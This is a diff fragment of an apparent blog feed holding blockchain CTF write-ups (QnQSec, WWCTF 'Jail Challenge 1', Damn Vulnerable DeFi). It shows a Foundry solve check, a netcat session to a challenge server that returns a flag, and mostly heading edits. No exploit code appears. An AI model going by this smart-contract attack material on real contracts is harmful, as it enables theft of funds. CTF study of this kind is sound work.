+nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL
+true ## true means the challenge is solved!
+</code></pre>
+
+<ul>
+  <li>To get Flag:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[timelock] Welcome anon!
+[timelock] 1 - Launch a new instance
+[timelock] 2 - Kill your instance
+[timelock] 3 - Get the flag
+[timelock] Action? 3
+
+[timelock] What is your ticket? 5e1412cd7083b4b49f31098c9b322b16
+[timelock] Nicely done! Now don't lose it: QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}
+
+</code></pre>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[I recently participated in QnsecCTF with my team, HackerTroupe. As usual, I solved the smart contract challenges.]]></summary></entry><entry><title type="html">WWCTF Blockchain Challenges</title><link href="https://block-programr.github.io/writeups/2025/07/27/WWCTF.html" rel="alternate" type="text/html" title="WWCTF Blockchain Challenges" /><published>2025-07-27T00:00:00+00:00</published><updated>2025-07-27T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/07/27/WWCTF</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/07/27/WWCTF.html"><![CDATA[<p>I recently participated in WWCTF with my team, <strong>HackerTroupe</strong>. As usual, I solved the smart contract challenges.</p>
+
+<h3 id="challenge-1">Challenge 1:</h3>
 
 <p>This is my solution for the “Jail Challenge 1” blockchain challenge.</p>
 
@@ -8,7 +752,7 @@
 
 <p>The challenge provides two files that define the environment.</p>
 
-<h4 id="1-the-jailer-contract-jailsol">1. The Jailer Contract (<code class="language-plaintext highlighter-rouge">Jail.sol</code>)</h4>
+<h4 id="the-jailer-contract-jailsol">The Jailer Contract (<code class="language-plaintext highlighter-rouge">Jail.sol</code>)</h4>
 
 <p>This contract takes arbitrary bytecode, deploys it using <code class="language-plaintext highlighter-rouge">create2</code>, and then executes its <code class="language-plaintext highlighter-rouge">main()</code> function. The flag we need to capture is a public state variable within this contract.</p>
 
@@ -33,7 +777,7 @@ contract BytecodeRunner {
 }
 </code></pre>
 
-<h4 id="2-the-jail-script-jailtalkpy">2. The Jail Script (<code class="language-plaintext highlighter-rouge">JailTalk.py</code>)</h4>
+<h4 id="the-jail-script-jailtalkpy">The Jail Script (<code class="language-plaintext highlighter-rouge">JailTalk.py</code>)</h4>
 
 <p>This Python script takes our input, wraps it inside the main() function of a Solution contract, and checks our code against a blacklist of keywords. If the code is valid, it’s compiled and sent to the BytecodeRunner contract.</p>
 
@@ -124,8 +868,9 @@ return my_result;
 <pre><code class="language-Plaintext">wwf{y0u_4r3_7h3_7ru3_m4573r_0f_s0l1d17y}
 </code></pre>
 
-<p>–
-<strong>Challenge2 is coming</strong></p>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[I recently participated in WWCTF with my team, HackerTroupe.As usual I solve the smart contract challenges]]></summary></entry><entry><title type="html">Damn-Defi Challenges</title><link href="https://block-programr.github.io/writeups/2025/04/30/DamnDefi.html" rel="alternate" type="text/html" title="Damn-Defi Challenges" /><published>2025-04-30T00:00:00+00:00</published><updated>2025-04-30T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/04/30/DamnDefi</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/04/30/DamnDefi.html"><![CDATA[<p><strong>GITHUB</strong>: <a href="https://  .com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/Dam-vulnerable-Defi">View</a></p>
+<hr />
+
+<p><strong>Challenge 2 is coming soon</strong></p>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[I recently participated in WWCTF with my team, HackerTroupe. As usual, I solved the smart contract challenges.]]></summary></entry><entry><title type="html">Damn-Defi Challenges</title><link href="https://block-programr.github.io/writeups/2025/04/30/DamnDefi.html" rel="alternate" type="text/html" title="Damn-Defi Challenges" /><published>2025-04-30T00:00:00+00:00</published><updated>2025-04-30T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/04/30/DamnDefi</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/04/30/DamnDefi.html"><![CDATA[<p><strong>GITHUB</strong>: <a href="https://  .com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/Dam-vulnerable-Defi">View</a></p>
 
 <h1 id="backdoor-challenge">Backdoor Challenge</h1>
 
